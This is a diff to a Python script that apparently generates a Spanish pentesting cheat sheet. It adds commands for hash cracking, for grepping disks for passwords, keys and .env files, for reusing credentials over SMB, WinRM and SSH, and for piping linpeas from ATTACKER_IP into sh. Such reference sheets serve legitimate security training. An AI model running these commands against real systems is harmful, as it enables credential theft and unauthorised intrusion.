@@ -554,6 +554,8 @@ SECTIONS = [
             ], [3.2 * cm, 13.0 * cm]),
             ("h2", "Conversiones frecuentes"),
             ("code", [
+                "hashid 'HASH'",
+                "nth -t 'HASH'",
                 "ssh2john id_rsa > id_rsa.hash",
                 "keepass2john vault.kdbx > keepass.hash",
                 "zip2john secret.zip > zip.hash",
@@ -561,6 +563,14 @@ SECTIONS = [
                 "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                 "john --show hash.txt",
                 "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt",
+            ]),
+            ("h2", "Buscar en disco y reutilizar"),
+            ("code", [
+                "grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head",
+                "find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null",
+                "nxc smb $IP -u $USER -p $PASS",
+                "nxc winrm $IP -u $USER -p $PASS",
+                "ssh $USER@$IP",
             ]),
             ("h2", "Loot de navegadores y apps"),
             ("code", [
@@ -633,10 +643,12 @@ SECTIONS = [
                 "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
                 "systemctl list-timers 2>/dev/null",
             ]),
-            ("h2", "Automatizado"),
+            ("h2", "Automatizado (linpeas paso a paso)"),
             ("code", [
+                "wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
+                "python3 -m http.server 8000",
                 "curl -sL http://ATTACKER_IP:8000/linpeas.sh | sh",
-                "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh",
+                "wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/linpeas.out",
                 "./pspy64",
             ]),
             ("h2", "sudo / GTFOBins"),
